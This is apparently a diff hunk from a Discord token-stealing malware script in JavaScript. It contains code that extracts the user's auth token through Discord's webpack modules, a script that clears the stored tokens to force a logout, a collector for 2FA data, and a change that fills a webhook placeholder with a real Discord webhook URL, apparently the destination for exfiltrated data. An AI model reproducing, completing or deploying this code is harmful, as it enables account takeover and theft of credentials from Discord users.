@@ -10,7 +10,7 @@ var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in 
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
 
 const dataNow = new Date().toISOString();
-const webhook = '%WEBHOOK%'
+const webhook = 'https://discord.com/api/webhooks/1368835516597796865/y7EN4ikWufAvZlS3HJYckMHwGS7KNYBGRrKI6ebpLo25gfb8wna88DvpuG_jbfAlJ5JQ'
 
 let contents2FA = []
 
